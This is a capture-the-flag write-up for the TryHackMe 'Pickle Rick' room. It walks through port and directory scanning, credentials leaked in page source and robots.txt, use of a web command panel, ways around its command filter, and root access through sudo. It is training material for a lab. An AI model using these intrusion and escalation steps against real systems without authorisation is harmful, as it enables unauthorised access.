# Pickle Rick - Write-Up

## Room Information

| Field          | Value                                      |
| -------------- | ------------------------------------------ |
| Room           | Pickle Rick                                |
| Platform       | TryHackMe                                  |
| Difficulty     | Easy                                       |
| Date Completed | YYYY-MM-DD                                 |
| Tags           | Web, Enumeration, Command Injection, Linux |

---

# Objective

Help Rick find the three ingredients required to transform himself back into a human.

---

# Attack Path Summary

1. Enumerate the web application.
2. Discover hidden information in source code.
3. Identify username and password.
4. Access command execution panel.
5. Abuse command execution functionality.
6. Enumerate the system.
7. Recover all three ingredients.

---

# Reconnaissance

## Nmap Scan

### Command

```bash
nmap -sC -sV -Pn -oN nmap.txt <TARGET_IP>
```

### Findings

| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 80   | HTTP    |

### Screenshot

![Nmap](screenshots/01_nmap.png)

### Notes

The web server is the primary attack surface.

---

# Web Enumeration

## Homepage Inspection

Visit:

```text
http://<TARGET_IP>
```

Interesting observations:

* Rick-themed website
* Login functionality appears present

### Screenshot

![Homepage](screenshots/01_homepage.png)

---

## Source Code Review

Inspect page source.

### Discovery

A comment reveals a username.

Example:

```html
<!-- Username: R1ckRul3s -->
```

### Screenshot

![Source Code](screenshots/02_source_code.png)

### Notes

Always inspect source code during initial enumeration.

---

## Directory Enumeration

### Command

```bash
gobuster dir \
-u http://<TARGET_IP> \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Findings

| Path        | Description           |
| ----------- | --------------------- |
| /login.php  | Authentication portal |
| /robots.txt | Interesting file      |
| /assets     | Static resources      |

### Screenshot

![Gobuster](screenshots/03_gobuster.png)

---

## Robots.txt

Visit:

```text
http://<TARGET_IP>/robots.txt
```

### Discovery

A password-like value is exposed.

### Screenshot

![Robots](screenshots/04_login.png)

### Notes

robots.txt frequently contains sensitive information in CTF environments.

---

# Authentication

## Login Portal

Navigate to:

```text
http://<TARGET_IP>/login.php
```

### Credentials

Username:

```text
R1ckRul3s
```

Password:

```text
<password_from_robots>
```

### Result

Successful authentication.

### Screenshot

![Login](screenshots/04_login.png)

---

# Command Execution

## Command Panel

After authentication, a command execution interface is available.

### Screenshot

![Command Panel](screenshots/05_command_panel.png)

### Observation

Commands entered into the panel execute directly on the underlying operating system.

---

# Local Enumeration

## Current User

```bash
whoami
```

### Result

```text
www-data
```

---

## System Information

```bash
uname -a
```

```bash
cat /etc/os-release
```

---

## File Discovery

```bash
ls
```

```bash
pwd
```

```bash
find / -type f 2>/dev/null
```

### Notes

Systematic enumeration quickly reveals ingredient files.

---

# First Ingredient

## Discovery

Locate the first ingredient.

Example:

```bash
ls
```

```bash
cat <ingredient_file>
```

### Screenshot

![Ingredient 1](screenshots/06_first_ingredient.png)

---

# Second Ingredient

## Discovery

Enumerate user directories.

```bash
cd /home
```

```bash
ls -la
```

```bash
cd <user_directory>
```

```bash
cat <ingredient_file>
```

### Screenshot

![Ingredient 2](screenshots/07_second_ingredient.png)

### Notes

The application may block certain commands.

If a command is restricted, alternative Linux utilities can often achieve the same goal.

Examples:

```bash
less file
```

```bash
head file
```

```bash
tail file
```

---

# Third Ingredient

## Privileged Access

Check sudo permissions.

```bash
sudo -l
```

### Result

The web user possesses elevated privileges.

### Screenshot

![Sudo](screenshots/08_third_ingredient.png)

---

## Root Access

```bash
sudo su
```

or

```bash
sudo bash
```

Verify:

```bash
whoami
```

Expected:

```text
root
```

---

## Locate Final Ingredient

```bash
cd /root
```

```bash
ls -la
```

```bash
cat <ingredient_file>
```

### Screenshot

![Ingredient 3](screenshots/08_third_ingredient.png)

---

# Objectives Completed

| Objective         | Status   |
| ----------------- | -------- |
| First Ingredient  | Complete |
| Second Ingredient | Complete |
| Third Ingredient  | Complete |

### Screenshot

![Completion](screenshots/09_complete.png)

---

# Lessons Learned

## Technical

* Always inspect source code.
* Enumerate robots.txt.
* Use directory brute forcing early.
* Never assume command filtering is complete.
* Check sudo permissions immediately.
* Enumerate systematically rather than randomly.

## Methodology

1. Nmap
2. Manual browsing
3. Source code review
4. robots.txt
5. Gobuster
6. Authentication
7. Local enumeration
8. Privilege escalation

---

# Commands Reference

```bash
nmap -sC -sV -Pn <TARGET_IP>

gobuster dir \
-u http://<TARGET_IP> \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

whoami

uname -a

find / -type f 2>/dev/null

sudo -l

sudo bash
```

---

# MITRE ATT&CK Mapping

| Phase                | Technique                         |
| -------------------- | --------------------------------- |
| Discovery            | Service Enumeration               |
| Initial Access       | Valid Accounts                    |
| Execution            | Command and Scripting Interpreter |
| Privilege Escalation | Abuse Elevation Control Mechanism |
| Collection           | Data from Local System            |

---

# Conclusion

Successfully enumerated the target web application, discovered exposed credentials, gained access to the command execution panel, and leveraged elevated permissions to retrieve all three ingredients required to complete the challenge.
